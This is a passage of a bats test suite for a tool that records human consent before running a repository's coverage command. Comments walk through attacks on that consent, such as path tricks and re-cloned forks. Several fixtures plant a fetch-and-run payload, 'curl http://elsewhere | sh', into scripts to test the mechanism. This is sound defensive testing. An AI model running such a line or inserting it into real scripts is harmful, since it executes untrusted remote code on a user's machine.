#!/usr/bin/env bats
# Consent to run a repository's .harmonia/project.yaml coverage command: recorded
# by a human on THIS machine, kept outside every repository, and read at the seam
# that is about to eval the value.
#
# THE PROPERTY, ROUND 5. A repository's `coverage:` value is evaluated only when a
# human on this machine read that exact string and recorded consent to it, and the
# string is confined to a small printable grammar so that what runs is what the
# words say. **Consent covers the string. It covers no file.**
#
# ROUND 6 NARROWS ONE ARM OF THAT GRAMMAR, and it is the arm four rounds in a row
# shipped a blocker in. A part's first word is now one of exactly NINE literals -
# `sh bash dash python python3 node`, bare and spelled exactly, plus `cd`, `echo`
# and `true` - and every first word carrying a `/` is refused whatever its
# basename and whatever it points at. Round 5 made a `/`-carrying first word its
# own class and left its later words unconstrained, so `/usr/bin/env PATH=fakebin
# sh ./cov.sh` recorded and ran the repository's own `fakebin/sh`, re-entering
# four of that round's own rules one word to the left.
#
# THE DELETION IS TWO EDITS AND THIS FILE PINS THEM SEPARATELY. Dropping the
# `/`-carrying class alone still admits `/bin/sh ./cov.sh` and `./sh ./cov.sh`,
# because the interpreter test asked for a BASENAME on the card; making that test
# exact alone still admits `./scripts/cov.sh` through the class. Measured: with
# only the first edit, `/bin/sh ./cov.sh`, `./sh ./cov.sh` and
# `/usr/bin/python3 ./x.py` all record; with only the second,
# `/usr/bin/env sh ./cov.sh` and `./node_modules/.bin/vitest run --coverage` do.
# So the two are asserted by different cells, and a build that lands one without
# the other goes red.
#
# Rounds 1-4 also claimed that consent bound the CONTENTS of the files the value
# named. That claim is retired, and this file is where the retirement is made
# durable: every shape the binding used to refuse now has an ACCEPT cell here, so
# a build that still refuses it goes red rather than merely unpinned, and every
# rewrite-withdraws-consent cell is inverted rather than deleted. The reason is in
# scope.md section 2 and it is short: `sh .harmonia/cov.sh` binds cov.sh, whose
# whole job is to run the repository's suite - hundreds of files the record never
# covered - so the mechanism stopped the rewrite of exactly one file, and evading
# it took no attacker and no skill.
#
# Written red-first against 762c48e, where bin/trust.sh does not exist. A test
# that merely dies on the missing file proves nothing, so every test below
# carries at least one cell that a build which refuses everything - or records
# nothing - cannot satisfy: an accept-side control, a message two causes must not
# share, or an exit code that 127 is not. The library is always reached through a
# subshell for the same reason: a failed `source` must not take the test body
# down before its assertions run.

setup() {
  REPO_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
  # Isolated store, the convention tests/memory.bats:6 and tests/hooks.bats:6
  # ship. Without it a suite run writes consent records into the developer's real
  # ~/.harmonia (2026-07-31 learning: a fixture whose verdict depends on an
  # ambient environment value goes green against the build it exists to reject).
  # HOME stays as it is: HARMONIA_HOME wins over it in the store's own
  # resolution, so this alone isolates every test but the two that unset it
  # deliberately, and those supply their own.
  export HARMONIA_HOME="$BATS_TEST_TMPDIR/home"
  TRUST="$REPO_ROOT/bin/trust.sh"

  R="$BATS_TEST_TMPDIR/repo"
  mk_repo "$R"
}

mk_repo() {   # <dir>: a git tree with a .harmonia/ and one committed file
  mkdir -p "$1/.harmonia"
  git -C "$1" init -q
  printf 'echo a\n' > "$1/f.sh"
  git -C "$1" add -A
  git -C "$1" -c user.email=t@t -c user.name=t commit -qm base
}

set_cov() {   # <dir> <value>: the coverage: line as a developer writes it
  printf 'coverage: %s\n' "$2" > "$1/.harmonia/project.yaml"
}

# The reader, asked the way the gate asks it (design section 5: the gate sources
# the library and takes the reason from stdout).
treason() {   # <repo> <command>
  bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$1" "$2"
}

tkey() {   # <path>
  bash -c 'set -u; . "$1" || exit 127; trust_key "$2"' _ "$TRUST" "$1"
}

store_files() {   # every record under the isolated store; an absent store is not an error
  find "$HARMONIA_HOME" -type f 2>/dev/null | sort
}

count_files() {   # <dir> -> how many regular files live under it, 0 when it does not exist
  find "$1" -type f 2>/dev/null | wc -l
}

@test "record writes one consent record, prints the command it attests, and the reader then accepts that exact string" {
  # The value is a wrapper script where round 2 wrote `touch RAN && echo cov.xml`.
  # Round 3 enumerates the shapes that can be attested at all and a bare-word
  # program is not one of them, so the old fixture is no longer recordable and the
  # cell would have red on its first line for a reason it is not about. Every
  # assertion below is round 2's, unchanged; the script keeps the `touch RAN` so
  # the "recording never runs it" assertion still has something to detect.
  write_script "$R/.harmonia/cov.sh" 'touch RAN'
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  # Step 5 of the recorder is the whole point of the human act: /harmonia:trust
  # prints the string it is about to make executable, so the developer reads it
  # before agreeing. (2026-07-31 learning: automating a hand-run step keeps the
  # privileges and drops the incidental controls - the printing is the control
  # that survives automation, which is why it is asserted even though no code
  # reads the output.)
  [[ "$output" == *"sh .harmonia/cov.sh && echo cov.xml"* ]]
  [ "$(store_files | wc -l)" -eq 1 ]        # one record, under the isolated store
  [ ! -e "$R/RAN" ]                         # recording agrees to a command; it never runs it
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]
}

@test "the recorder digests the value the gate will run, so a quoted coverage line attests its unquoted form" {
  # config-lib.sh:22-25 strips one matching quote pair before the gate evals the
  # value, so a quoted value and a bare one execute identically (2026-07-08). The
  # recorder therefore has to read through the same reader the gate uses, or the
  # two drift and a legitimately quoted project.yaml can never be attested.
  # Same fixture move as the cell above, and the same reason: the quoting is what
  # this test is about, so the quoted string has to be one the grammar admits.
  write_script "$R/.harmonia/cov.sh" 'touch RAN'
  printf 'coverage: "sh .harmonia/cov.sh && echo cov.xml"\n' > "$R/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  [[ "$output" == *"sh .harmonia/cov.sh && echo cov.xml"* ]]   # printed as it will execute, not as it is written
  [ ! -e "$R/RAN" ]                                            # the payload is here to be detected, so detect it (round 3 n4)
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'       # ...and attested as the gate will ask about it
  [ "$status" -eq 0 ]
}

@test "with HARMONIA_HOME unset the record lands under the home-directory store and is read back from there" {
  set_cov "$R" 'echo cov.xml'
  local fake="$BATS_TEST_TMPDIR/fakehome"
  mkdir -p "$fake"
  # ${HARMONIA_HOME:-$HOME/.harmonia} is the root bin/memory/store-lib.sh:7
  # already uses, and HARMONIA_HOME is unset for almost every developer: a build
  # that honours only the override half refuses every repository on the machine
  # forever, which no reject-side cell can catch.
  run env -u HARMONIA_HOME HOME="$fake" bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  [ "$(count_files "$fake/.harmonia")" -eq 1 ]
  [ "$(store_files | wc -l)" -eq 0 ]             # nothing under the unset override
  run env -u HARMONIA_HOME HOME="$fake" bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$R" 'echo cov.xml'
  [ "$status" -eq 0 ]
  # The override wins when it IS set, which is what makes this suite's isolation
  # real rather than nominal: the record just written is not visible through it.
  run treason "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
}

@test "trust_key answers the physically resolved tree, and never the cwd for an operand it cannot honour" {
  ln -s "$R" "$BATS_TEST_TMPDIR/link"
  run tkey "$R"
  [ "$status" -eq 0 ]
  [ "$output" = "$(cd "$R" && pwd -P)" ]
  # gate.sh:39 resolves $REPO logically, so a symlinked --repo reaches the seam
  # under a different name than the recorder saw. One tree must mint one key or
  # C4's symlinked cell refuses a repo the developer attested.
  run tkey "$BATS_TEST_TMPDIR/link"
  [ "$status" -eq 0 ]
  [ "$output" = "$(cd "$R" && pwd -P)" ]
  # `cd ""` returns 0 in bash and leaves the cwd where it is, so an unguarded key
  # answers $PWD for a tree the caller never named - and gate.sh:39 is an
  # unguarded `cd`, so REPO="" is reachable from the gate too.
  cd "$R"
  run tkey ""
  [ "$status" -ne 0 ]
  [ "$output" != "$(cd "$R" && pwd -P)" ]
  run tkey "$BATS_TEST_TMPDIR/nope"
  [ "$status" -ne 0 ]
  [ "$output" != "$(cd "$R" && pwd -P)" ]
}

@test "with no consent recorded the reader refuses, names the file and the human command, and hands over no script path" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]                            # the control: this store does attest something
  local other="$BATS_TEST_TMPDIR/other"
  mk_repo "$other"; set_cov "$other" 'echo cov.xml'
  # C3 cell 1's shape at the reader: same near-canonical command, another tree.
  # A key derived from anything the repository can choose - a remote URL, a git
  # common dir, a toplevel - matches here and executes.
  run treason "$other" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *".harmonia/project.yaml"* ]]  # names what to read...
  [[ "$output" == *"/harmonia:trust"* ]]         # ...and the human command that authorises it
  [[ "$output" != *"trust.sh"* ]]                # never the script path that clears the refusal
  [[ "$output" != *"bin/"* ]]
}

@test "a consent record truncated to nine bytes is refused rather than read" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'echo cov.xml'
  [ "$status" -eq 0 ]                            # positive control: the whole record accepts
  # The memory tier under this same root is deliberately fail-open and
  # torn-line-tolerant (recall.sh:37,:50,:73); a consent record is not. Nine
  # bytes is inside the range that must refuse - it reaches the line that binds
  # the record to this tree. This is NOT a claim that every truncation refuses:
  # one that eats only an unread trailing line leaves the record semantically
  # complete, and the design measures 31 such lengths still accepting.
  local recs; recs="$(store_files)"
  [ -n "$recs" ]
  while IFS= read -r rec; do
    [ -n "$rec" ] || continue
    head -c 9 "$rec" > "$rec.part" && mv "$rec.part" "$rec"
  done <<< "$recs"
  run treason "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]         # a refusal the developer can act on, not a silent one
}

@test "a consent record recorded for another tree does not attest this one" {
  # No record-format knowledge in this fixture: the payload is a record the
  # recorder itself wrote, for a different tree, carrying the same command.
  # Each store holds exactly one file, so swapping the CONTENT under this tree's
  # own record name asks the only question that discriminates - does the record
  # say it is about this tree - without asserting how the record is written.
  set_cov "$R" 'echo cov.xml'
  local other="$BATS_TEST_TMPDIR/other"
  mk_repo "$other"; set_cov "$other" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run env HARMONIA_HOME="$BATS_TEST_TMPDIR/other-store" bash "$TRUST" record --repo "$other"
  [ "$status" -eq 0 ]
  local mine theirs
  mine="$(store_files)"
  theirs="$(find "$BATS_TEST_TMPDIR/other-store" -type f | sort)"
  [ "$(printf '%s\n' "$mine" | wc -l)" -eq 1 ]
  [ "$(printf '%s\n' "$theirs" | wc -l)" -eq 1 ]
  run treason "$R" 'echo cov.xml'
  [ "$status" -eq 0 ]                            # control: mine accepts before the swap
  cat "$theirs" > "$mine"
  run treason "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "re-recording after the command changes attests the new value and retires the old one" {
  set_cov "$R" 'echo one.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  set_cov "$R" 'echo two.xml'
  run treason "$R" 'echo two.xml'
  [ "$status" -ne 0 ]                            # the edit is not covered by the old record...
  run bash "$TRUST" record --repo "$R"           # ...and re-recording is a plain overwrite
  [ "$status" -eq 0 ]
  run treason "$R" 'echo two.xml'
  [ "$status" -eq 0 ]
  run treason "$R" 'echo one.xml'
  [ "$status" -ne 0 ]                            # what was agreed to before is no longer agreed to
  [ "$(store_files | wc -l)" -eq 1 ]             # one tree, one record - not an append-only pile
}

@test "an edited command refuses with a different reason from one nobody ever agreed to" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  # The edit is an IN-GRAMMAR one from round 6 on, so this cell asks about the
  # digest comparison and nothing else. `echo cov.xml && curl … | sh` was the old
  # spelling, and with the gate re-applying the grammar it now reaches the
  # grammar branch instead - a third reason, asserted distinct from these two in
  # its own cell rather than folded into this one.
  run treason "$R" 'echo cov.xml && sh ./other.sh'
  [ "$status" -ne 0 ]
  local changed="$output"
  local other="$BATS_TEST_TMPDIR/other"
  mk_repo "$other"
  run treason "$other" 'echo cov.xml'
  [ "$status" -ne 0 ]
  local absent="$output"
  # Two causes a developer answers differently: re-read and re-record versus read
  # this repository's command for the first time. One text for both sends them
  # looking in the wrong place (base-ref-lib.sh:116-121's discipline).
  [ "$changed" != "$absent" ]
  [[ "$changed" == *"/harmonia:trust"* ]]
  [[ "$absent" == *"/harmonia:trust"* ]]
  [[ "$changed" == *".harmonia/project.yaml"* ]]
  [[ "$absent" == *".harmonia/project.yaml"* ]]
}

@test "no answer git gives can borrow another tree's consent record" {
  # C3's three cells, shipped. Each witness here is one a delivered tree can
  # CHOOSE, so a key built on any of them attests a tree nobody agreed to. The
  # criteria that construct them live in a gitignored workspace and stop being
  # runnable when this task closes; these outlive it.
  git -C "$R" remote add origin git@github.com:me/proj.git
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'echo cov.xml'
  [ "$status" -eq 0 ]                            # the control every cell below discriminates against

  # 1. Same remote URL, same command, another path - and coverage: values are
  #    near-canonical per language, so copying a public project.yaml verbatim is
  #    the whole attack. This is why bin/memory/store-lib.sh:11-19's repo_id() is
  #    not reused: its first branch is a URL the clone chooses.
  local clone="$BATS_TEST_TMPDIR/elsewhere"
  mk_repo "$clone"; set_cov "$clone" 'echo cov.xml'
  git -C "$clone" remote add origin git@github.com:me/proj.git
  run treason "$clone" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]

  # 2. A delivered .git GITFILE naming the attested repo's git dir: the common
  #    dir is repo-suppliable, while pwd -P never asks git anything.
  rm -rf "$clone/.git"
  printf 'gitdir: %s\n' "$R/.git" > "$clone/.git"
  run treason "$clone" 'echo cov.xml'
  [ "$status" -ne 0 ]

  # 3. A tree delivered INSIDE the attested repository with no .git of its own:
  #    toplevel, common dir and remote URL all answer the attested repository's.
  #    The scope attack's reference build keyed on --show-toplevel, passed all
  #    eight criteria with bats green, and executed the payload from exactly this
  #    shape. Only this tree's own resolved path refuses it, and only if the
  #    lookup is exact equality rather than an ancestor walk.
  local nested="$R/vendor/evil"
  mkdir -p "$nested/.harmonia"
  set_cov "$nested" 'echo cov.xml'
  run treason "$nested" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "record refuses a tree with nothing to agree to, and reads differently when there is no project.yaml there at all" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]                            # the control
  local nocov="$BATS_TEST_TMPDIR/nocov"
  mk_repo "$nocov"
  printf 'test: bats tests/\nlint: true\n' > "$nocov/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$nocov"
  [ "$status" -ne 0 ]
  local nocov_msg="$output"
  local bare="$BATS_TEST_TMPDIR/bare"
  mk_repo "$bare"; rm -rf "$bare/.harmonia"
  run bash "$TRUST" record --repo "$bare"
  [ "$status" -ne 0 ]
  # The skill's wrapper is `--repo .`, so the shape a developer actually hits is
  # running it from a subdirectory. One message for both causes tells them their
  # config is wrong when their cwd is wrong.
  [ "$output" != "$nocov_msg" ]
  [ "$(store_files | wc -l)" -eq 1 ]             # neither refusal left a record behind
}

@test "record refuses an empty or unenterable --repo instead of attesting the cwd" {
  set_cov "$R" 'echo cov.xml'
  cd "$R"
  run bash "$TRUST" record --repo ""
  [ "$status" -ne 0 ]
  [ "$(store_files | wc -l)" -eq 0 ]             # `cd ""` succeeds and leaves the cwd where it is
  run bash "$TRUST" record --repo "$BATS_TEST_TMPDIR/nope"
  [ "$status" -ne 0 ]
  [ "$(store_files | wc -l)" -eq 0 ]
  # The control that makes those two mean something: the same recorder, from the
  # same cwd, records when it is handed the tree it is looking at.
  run bash "$TRUST" record --repo .
  [ "$status" -eq 0 ]
  [ "$(store_files | wc -l)" -eq 1 ]
  run treason "$R" 'echo cov.xml'
  [ "$status" -eq 0 ]
}

@test "with neither HARMONIA_HOME nor HOME set the recorder and the reader refuse by name instead of crashing" {
  set_cov "$R" 'echo cov.xml'
  # This path runs at every implement round, so an unset HOME must be a named
  # refusal and never a `set -u` unbound-variable death - the shape
  # bin/install-opencode.sh:78-82 already ships.
  run env -u HARMONIA_HOME -u HOME bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ]
  [[ "$output" == *HOME* ]]
  [[ "$output" != *"unbound variable"* ]]
  run env -u HARMONIA_HOME -u HOME bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *HOME* ]]
  [[ "$output" != *"unbound variable"* ]]
}

@test "record refuses when the store cannot be created, and the reader does not then accept" {
  set_cov "$R" 'echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]                            # the control
  printf 'not a directory\n' > "$BATS_TEST_TMPDIR/wall"
  run env HARMONIA_HOME="$BATS_TEST_TMPDIR/wall/store" bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ]                            # a write that cannot land is not a recorded consent
  [ ! -d "$BATS_TEST_TMPDIR/wall/store" ]
  run env HARMONIA_HOME="$BATS_TEST_TMPDIR/wall/store" bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$R" 'echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "an unknown subcommand and an unknown argument exit 1 with usage" {
  run bash "$TRUST" frobnicate
  [ "$status" -eq 1 ]
  [[ "$output" == *"usage:"* ]]
  run bash "$TRUST" record --bogus
  [ "$status" -eq 1 ]
  [[ "$output" == *"unknown argument"* ]]
}

# --- consent covers the string, and no file ----------------------------------
# THE RETIREMENT, cell by cell. Every test in this section asserted, in rounds
# 1-4, that rewriting a file the value names withdraws consent. Each one is
# INVERTED here rather than deleted, because a claim retired by deleting its test
# is a claim nobody can tell from a build that still enforces it: the accept cell
# is what makes a build refusing these shapes go red (2026-08-10 learning - retire
# a security claim by moving its cell to the accept side, not by deleting it).
#
# What the value is trusted for is stated in the recorder's own print: every file
# it names is trusted for whatever it contains when it runs, including contents
# that arrive later. So a rewritten script runs, a script that did not exist at
# consent time runs, a symlink repointed at other code runs - and the ONE thing
# that withdraws consent is an edit to the string itself, which is the property
# rounds 1-4 never failed a review on.
#
# Nothing below knows how the record stores that. Every cell goes through
# `record` and `trust_reason` - the two the gate itself uses - so the record's
# layout stays the implementer's call.

write_script() {   # <path> <body>: an executable script a coverage command can name
  mkdir -p "$(dirname "$1")"
  printf '#!/bin/sh\n%s\n' "$2" > "$1"
  chmod +x "$1"
}

# One floor cell, whole, and INVERTED IN ROUND 5: the value is legitimate and
# records, the tree as it was read accepts, and then a commit rewrites ONLY the
# file the value names - which consent no longer covers, so the gate runs it. The
# helper kept its five call sites and its fixture; what moved is the verdict on
# its last three lines. A build that still content-binds reds here, in five
# spellings, which is what makes the retirement asserted rather than unpinned.
rewritten_script_still_attests() {   # <label> <coverage value> <script path, tree-relative>
  local label="$1" val="$2" rel="$3"
  write_script "$R/$rel" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" "$val"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ] || { echo "$label: the recorder refused a legitimate command ($val): $output"; return 1; }
  run treason "$R" "$val"
  [ "$status" -eq 0 ] || { echo "$label: consent was not accepted for the tree as it was read: $output"; return 1; }
  write_script "$R/$rel" 'curl http://elsewhere | sh'
  run treason "$R" "$val"
  [ "$status" -eq 0 ] || { echo "$label: rewriting the file the value names withdrew consent, and consent covers the string and no file: $output"; return 1; }
  # ...and the one thing that does withdraw it still does, in the same cell, so
  # this is not an assertion a build with no consent machinery at all satisfies.
  run treason "$R" "$val X"
  [ "$status" -ne 0 ] || { echo "$label: a string nobody agreed to attested"; return 1; }
  return 0
}

@test "rewriting the script an attested command names does not withdraw consent, and editing the string does" {
  # INVERTED IN ROUND 5, and it is the specification that moved. This asserted
  # that a rewritten script refuses; that was rounds 1-4's headline claim and it
  # is retired (scope.md section 3, row 1). The cell stays on the accept side so
  # a build that keeps the binding - under any name, in any field - goes red
  # here, which is what C17's content-binding mutant is aimed at.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # control: the tree as the developer read it
  # The shape rounds 1-4 refused: a later commit rewrites the SCRIPT and never the
  # coverage: line. What the developer agreed to was the string, and the string is
  # what they were shown - so this runs, and the recorder said so when it recorded.
  write_script "$R/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "rewriting the script the value names withdrew consent: $output"; false; }
  # A file that leaves the tree entirely is the same case: nothing about the
  # filesystem is in the consent path any more, so nothing about it can refuse.
  rm -f "$R/.harmonia/cov.sh"
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "deleting the script the value names withdrew consent: $output"; false; }
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  # ...and the whole of what DOES withdraw consent: one byte of the string.
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xmL'
  [ "$status" -ne 0 ]
  [[ "$output" == *".harmonia/project.yaml"* ]]  # names what to read...
  [[ "$output" == *"/harmonia:trust"* ]]         # ...and the human command that authorises it
  [[ "$output" != *"trust.sh"* ]]                # never the script path that clears the refusal
  run bash "$TRUST" record --repo "$R"           # re-recording the same string is still a plain overwrite
  [ "$status" -eq 0 ]
  [ "$(store_files | wc -l)" -eq 1 ]             # one tree, one record - still not an append-only pile
}

@test "every spelling that runs a file runs it after a rewrite: python3, an interpreter word, no extension, past a ; and inside quotes" {
  # INVERTED IN ROUND 5, five cells, and the five spellings are kept exactly as
  # they were: each one killed a build that bound too narrowly, and each is now
  # the accept cell that kills a build that binds at all. A build that keeps the
  # binding for `sh <script>` and loses it for `bash <script>` was the round-1
  # defect; here it reds on one row and not the others, which is what a table
  # rather than a single cell buys.
  #
  # `sh .harmonia/cov` keeps its extensionless operand and `sh 'x'` its quotes;
  # both carry a `/` because R10 asks an interpreter's operand for one.
  #
  # ROUND 6 RESPELLS ROW ONE and keeps its assertions: `./scripts/cov.sh` was a
  # `/`-carrying first word, which is a class that no longer exists, so the row
  # that covered "a program named by a path" now covers the third interpreter on
  # the card instead. The row is not deleted - what it holds is that the
  # retirement reaches more than one first-word spelling, and `python3` is a
  # spelling nothing else in this table uses.
  rewritten_script_still_attests 'a python3 head'             'python3 ./scripts/cov.py && echo cov.xml'  scripts/cov.py
  rewritten_script_still_attests 'bash, past a first segment' 'true && bash ./tools/c.sh && echo cov.xml' tools/c.sh
  rewritten_script_still_attests 'an operand with no suffix'  'sh .harmonia/cov && echo cov.xml'          .harmonia/cov
  rewritten_script_still_attests 'a ;-separated segment'      'sh scripts/c2.sh; echo cov.xml'            scripts/c2.sh
  rewritten_script_still_attests 'a quoted operand'           "sh '.harmonia/cov.sh' && echo cov.xml"     .harmonia/cov.sh
}

@test "a script that is not there yet is recordable, and stays consented to when it appears, changes and is deleted" {
  # MOVED TO THE ACCEPT SIDE IN ROUND 5, and it is the specification that moved
  # for the second time. Round 3 recorded `sh .harmonia/late.sh` while the script
  # did not exist; round 4 refused it at the door, because absence was the one
  # recorded state that stayed put while real code appeared somewhere else; round
  # 5 has no recorded state to stay put, so absence and presence are the same
  # trust surface and R9 is retired with the binding. The developer who agreed to
  # `sh .harmonia/late.sh` agreed to whatever `.harmonia/late.sh` holds when the
  # gate runs - which is what the recorder tells them, in the same act.
  #
  # This is also the shape a generated runner and a `npm ci` tool produce, and it
  # is where round 4's cost was largest: a repository that records before its
  # build has run could not be onboarded at all.
  [ ! -e "$R/.harmonia/late.sh" ]
  set_cov "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ] || { echo "a value naming a script that is not there yet was refused: $output"; false; }
  [ "$(store_files | wc -l)" -eq 1 ]
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  [ "$status" -eq 0 ]
  # It appears - which is the case R9 existed to refuse - and consent is unchanged.
  write_script "$R/.harmonia/late.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  [ "$status" -eq 0 ]
  # Absence in a NON-executed position is untouched: the report is written by the
  # coverage run itself, so binding it would refuse the repository on the first
  # gate run, and rewriting it would refuse on the second.
  mkdir -p "$R/out"
  printf '<coverage version="1"/>\n' > "$R/out/cov.xml"
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  [ "$status" -eq 0 ]
  printf '<coverage version="2"/>\n' > "$R/out/cov.xml"
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  [ "$status" -eq 0 ]
  # The deletion half, inverted with the rest: a build that recomputes anything
  # from the tree reds here, and so does one that froze a reference set at record
  # time and compares it. Consent is a fact about a string and a path, and neither
  # of them moved.
  rm -f "$R/.harmonia/late.sh"
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov.xml'
  [ "$status" -eq 0 ]
  # ...while the string still decides, in the same cell, so none of the above is
  # satisfied by a build that accepts everything.
  run treason "$R" 'sh .harmonia/late.sh && echo out/cov2.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "a tree deleted and cloned again in place keeps the consent recorded for the path, which is the sharpest thing the retirement gives up" {
  # ROUND 5's retirement table has thirteen rows and this was the one with no cell
  # anywhere in tests/ - the row measured as moved and asserted nowhere, so a
  # build that still refused it would have gone red in no file. It is also the
  # row a reader is least likely to accept on trust, which is the argument for
  # asserting it rather than declaring it: consent is keyed by the resolved path
  # and the exact string, so `rm -rf <path> && git clone <fork> <path>` with a
  # byte-identical coverage: line runs the fork's script under the original
  # consent. The content binding was the only thing that ever caught it, and the
  # documents state the loss in those words.
  #
  # Written as the whole act - record, delete, clone a DIFFERENT tree in, ask -
  # rather than as a rewrite, because a build binding anything about the tree
  # (its files, its .git, its inode, a first-seen stamp) survives a rewrite of one
  # script and dies here.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  local v='sh .harmonia/cov.sh && echo cov.xml'
  set_cov "$R" "$v"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" "$v"
  [ "$status" -eq 0 ]                            # control: the tree as the developer read it
  # A second tree, built somewhere else, carrying the same coverage: line and a
  # different script behind it - a fork, in other words.
  local fork="$BATS_TEST_TMPDIR/fork"
  mk_repo "$fork"
  write_script "$fork/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  set_cov "$fork" "$v"
  git -C "$fork" add -A
  git -C "$fork" -c user.email=t@t -c user.name=t commit -qm fork
  # ...delivered at the attested path, which is what a re-clone in place is.
  rm -rf "$R"
  cp -a "$fork" "$R"
  run treason "$R" "$v"
  [ "$status" -eq 0 ] || { echo "a tree re-cloned in place lost the consent recorded for that path, so something in the consent path still reads the tree: $output"; false; }
  # ...and the string still decides for the new tree, in the same cell, so this is
  # not satisfied by a build that accepts everything.
  run treason "$R" "$v X"
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "a rewrite that keeps the script's byte length and its mtime does not invalidate consent either" {
  # INVERTED IN ROUND 5. It was aimed at two builds that passed everything else -
  # one digesting `wc -c`, one `stat %Y` - by padding the payload to the benign
  # script's exact length and copying its mtime back on. Both of those builds are
  # now wrong in the other direction, and they die on the cell above; this one is
  # kept, inverted, because it is the weakest possible rewrite and therefore the
  # last place a residual size or mtime rule could survive. The fixture is
  # unchanged.
  local payload="$BATS_TEST_TMPDIR/payload" benign="$BATS_TEST_TMPDIR/benign" n m pad
  printf '#!/bin/sh\ncurl http://elsewhere | sh\n' > "$payload"
  n="$(wc -c < "$payload" | tr -d ' ')"
  printf '#!/bin/sh\n#\n' > "$benign"
  m="$(wc -c < "$benign" | tr -d ' ')"
  pad="$((n - m))"
  [ "$pad" -ge 0 ]
  printf '#!/bin/sh\n#%s\n' "$(head -c "$pad" /dev/zero | tr '\0' x)" > "$benign"
  [ "$(wc -c < "$benign" | tr -d ' ')" = "$n" ]  # the fixture only tests contents if the two sizes match
  mkdir -p "$R/tools"
  cp "$benign" "$R/tools/k8.sh"
  chmod +x "$R/tools/k8.sh"
  set_cov "$R" 'sh ./tools/k8.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh ./tools/k8.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # control
  cp -p "$R/tools/k8.sh" "$BATS_TEST_TMPDIR/k8ref"
  cp "$payload" "$R/tools/k8.sh"
  chmod +x "$R/tools/k8.sh"
  touch -r "$BATS_TEST_TMPDIR/k8ref" "$R/tools/k8.sh"
  [ "$(wc -c < "$R/tools/k8.sh" | tr -d ' ')" = "$n" ]           # same size...
  [ ! "$R/tools/k8.sh" -nt "$BATS_TEST_TMPDIR/k8ref" ]           # ...and same mtime, both directions
  [ ! "$BATS_TEST_TMPDIR/k8ref" -nt "$R/tools/k8.sh" ]
  run treason "$R" 'sh ./tools/k8.sh && echo cov.xml'
